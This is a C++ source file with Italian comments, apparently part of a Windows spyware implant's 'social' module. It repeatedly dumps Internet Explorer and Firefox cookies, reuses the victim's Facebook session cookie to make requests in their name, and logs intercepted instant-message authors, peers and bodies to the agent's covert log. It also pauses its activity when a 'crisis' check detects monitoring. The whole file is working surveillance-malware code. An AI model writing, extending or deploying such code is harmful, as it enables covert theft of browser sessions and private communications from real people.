
#define SLEEP_COOKIE 30 // In secondi
#define SOCIAL_LONG_IDLE 20 // In multipli di SLEEP_COOKIE (10 minuti)
#define SOCIAL_SHORT_IDLE 4 // In multipli di SLEEP_COOKIE (2 minuti)

#define _CRT_SECURE_NO_WARNINGS 1
#include <windows.h>
#include <stdio.h>
#include "..\common.h"
#include "..\LOG.h"
#include "..\bin_string.h"
#include "CookieHandler.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

extern DWORD HandleFaceBook(char *); // Handler per FaceBook
extern int DumpFFCookies(void); // Cookie per Facebook
extern int DumpIECookies(void); // Cookie per IExplorer

extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
extern BOOL IsCrisisNetwork();
extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi

social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];

// Simple ascii url decode
void urldecode(char *src)
{
	char *dest = src;
	char code[3] = {0};
	unsigned long ascii = 0;
	char *end = NULL;

	while(*src) {
		if(*src=='\\' && *(src+1)=='u') {
			src+=4;
			memcpy(code, src, 2);
			ascii = strtoul(code, &end, 16);
			*dest++ = (char)ascii;
			src += 2;
		} else
			*dest++ = *src++;
	}
	*dest = 0;
}

void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp) 
{
	WCHAR *program_w;
	WCHAR *topic_w;
	WCHAR *peers_w;
	WCHAR *author_w;
	WCHAR *body_w;

	program_w = UTF8_2_UTF16(program);
	topic_w = UTF8_2_UTF16(topic);
	peers_w = UTF8_2_UTF16(peers);
	author_w = UTF8_2_UTF16(author);
	body_w = UTF8_2_UTF16(body);

	LogSocialIMMessageW(program_w, topic_w, peers_w, author_w, body_w, tstamp); 

	SAFE_FREE(program_w);
	SAFE_FREE(topic_w);
	SAFE_FREE(peers_w);
	SAFE_FREE(author_w);
	SAFE_FREE(body_w);
}

void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *author, WCHAR *body, struct tm *tstamp) 
{
	bin_buf tolog;
	DWORD delimiter = ELEM_DELIMITER;

	if (program && topic && peers && body && author) {
		tolog.add(&tstamp, sizeof(tstamp));
		tolog.add(program, (wcslen(program)+1)*sizeof(WCHAR));
		tolog.add(topic, (wcslen(topic)+1)*sizeof(WCHAR));
		tolog.add(peers, (wcslen(peers)+1)*sizeof(WCHAR));
		tolog.add(author, wcslen(author)*sizeof(WCHAR));
		tolog.add(L": ", wcslen(L": ")*sizeof(WCHAR));
		tolog.add(body, (wcslen(body)+1)*sizeof(WCHAR));
		tolog.add(&delimiter, sizeof(DWORD));
		LOG_InitAgentLog(PM_IMAGENT_SOCIAL);
		LOG_ReportLog(PM_IMAGENT_SOCIAL, tolog.get_buf(), tolog.get_len());
		LOG_StopAgentLog(PM_IMAGENT_SOCIAL);
	}
}

void DumpNewCookies()
{
	ResetNewCookie();
	DumpIECookies();
	DumpFFCookies();
	//DumpCHCookies(); // XXX
}

void CheckProcessStatus()
{
	while(social_process_control == SOCIAL_PROCESS_PAUSE) 
		Sleep(500);
	if (social_process_control == SOCIAL_PROCESS_EXIT)
		ExitProcess(0);
}

void InitSocialEntries()
{
	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++) {
		social_entry[i].idle = 0;
		social_entry[i].is_new_cookie = FALSE;
		social_entry[i].wait_cookie = TRUE;
	}
	wcscpy_s(social_entry[0].domain, FACEBOOK_DOMAIN);
	social_entry[0].RequestHandler = HandleFaceBook;
}

void SocialMainLoop()
{
	DWORD i, ret;
	char *str;

	InitSocialEntries();
	SocialWinHttpSetup(L"http://www.facebook.com");
	LOG_InitSequentialLogs();

	for (;;) {
		// Busy wait...
		for (int j=0; j<SLEEP_COOKIE; j++) {
			Sleep(1000);
			CheckProcessStatus();
		}

		// XXX Aggiungo gli altri agenti interessati
		if (!bPM_IMStarted /*&& !bPM_MailStarted*/)
			continue;

		// Verifica se qualcuno e' in attesa di nuovi cookies
		// o se sta per fare una richiesta
		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
			// Se si, li dumpa
			if (social_entry[i].wait_cookie || social_entry[i].idle == 0) {
				DumpNewCookies();
				break;
			}
		}

		// Se stava aspettando un cookie nuovo
		// e c'e', allora esegue subito la richiesta
		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) 
			if (social_entry[i].wait_cookie && social_entry[i].is_new_cookie) {
				social_entry[i].idle = 0;
				social_entry[i].wait_cookie = FALSE;
			}
		
		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
			// Vede se e' arrivato il momento di fare una richiesta per 
			// questo social
			if (social_entry[i].idle == 0) { 
				char domain_a[64];
				CheckProcessStatus();
				_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);		
 				if (str = GetCookieString(domain_a)) {
					if (!IsCrisisNetwork() && social_entry[i].RequestHandler)
						ret = social_entry[i].RequestHandler(str);
					 else
						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
					SAFE_FREE(str);

					if (ret == SOCIAL_REQUEST_SUCCESS) {
						social_entry[i].idle = SOCIAL_LONG_IDLE;
						social_entry[i].wait_cookie = FALSE;
					} else if (ret == SOCIAL_REQUEST_BAD_COOKIE) {
						social_entry[i].idle = SOCIAL_LONG_IDLE;
						social_entry[i].wait_cookie = TRUE;
					} else { // network problems...
						social_entry[i].idle = SOCIAL_SHORT_IDLE;
						social_entry[i].wait_cookie = TRUE;
					}
				} else { // no cookie = bad cookie
					social_entry[i].idle = SOCIAL_LONG_IDLE;
					social_entry[i].wait_cookie = TRUE;
				}
			} else 
				social_entry[i].idle--;
		}
	}
}

